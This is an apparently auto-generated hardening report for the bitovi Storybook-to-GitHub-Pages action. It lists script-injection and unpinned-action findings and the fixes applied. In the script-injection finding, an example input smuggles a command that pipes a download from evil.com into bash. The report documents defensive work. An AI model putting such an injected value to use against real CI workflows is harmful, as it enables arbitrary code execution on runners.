# Hardening Report: bitovi--github-actions-storybook-to-github-pages/v1.0.3

> This file was generated automatically by the hardening agent.

**Policy SHA:** `ff50f15e4b79bfbf764dafdfd2579175a6ea9771`

**Test Policy SHA:** `843adf9e4b8f85d0c08b27b9d0b09dd094b54702`

**Harden Agent Version:** `1`

Action **bitovi--github-actions-storybook-to-github-pages/v1.0.3** was hardened automatically. 4 finding(s) were identified and resolved across 1 iteration(s).

## Findings Fixed

### script-injection (severity: high)

The 'Build' step directly interpolates attacker-controlled inputs `${{ inputs.install_command }}` and `${{ inputs.build_command }}` inside a `run:` shell block. These values are executed verbatim as shell commands rather than being assigned to environment variables first. A malicious caller can supply a value like `; curl https://evil.com/payload | bash` to execute arbitrary code on the runner.

Locations:

- `action.yaml:38`
- `action.yaml:39`

### unpinned-uses (severity: high)

Three `uses:` references in action.yaml use mutable version tags instead of immutable 40-character commit SHA digests, making the action vulnerable to supply-chain attacks if the referenced tag is moved or overwritten:
- `actions/checkout@v4` (line 33)
- `actions/upload-pages-artifact@v3` (line 43)
- `actions/deploy-pages@v4` (line 47)

Locations:

- `action.yaml:33`
- `action.yaml:43`
- `action.yaml:47`

### static-inline-injection (severity: high)

shell injection: expression "${{ inputs.install_command }}" appears directly in run: block of step "Build"; move to env: map

Locations:

- `action.yml:43`

### static-inline-injection (severity: high)

shell injection: expression "${{ inputs.build_command }}" appears directly in run: block of step "Build"; move to env: map

Locations:

- `action.yml:44`

## Iteration Notes

### Iteration 1

**Fixes applied:** script-injection, unpinned-uses, static-inline-injection

**Notes:**

Fixed action.yaml with two categories of changes:
1. Script injection: Moved `${{ inputs.install_command }}` and `${{ inputs.build_command }}` from the run: shell block into an env: map (INSTALL_COMMAND, BUILD_COMMAND), then referenced them as plain environment variables via `eval "$INSTALL_COMMAND"` and `eval "$BUILD_COMMAND"`.
2. Unpinned uses: Pinned all three action references to full 40-character commit SHAs — actions/checkout@v4 → @34e114876b0b11c390a56381ad16ebd13914f8d5, actions/upload-pages-artifact@v3 → @56afc609e74202658d3ffba0e8f6dda462b719fa, actions/deploy-pages@v4 → @d6db90164ac5ed86f2b6aed7e0febac5b3c0c03e — with the original tag preserved as a comment.

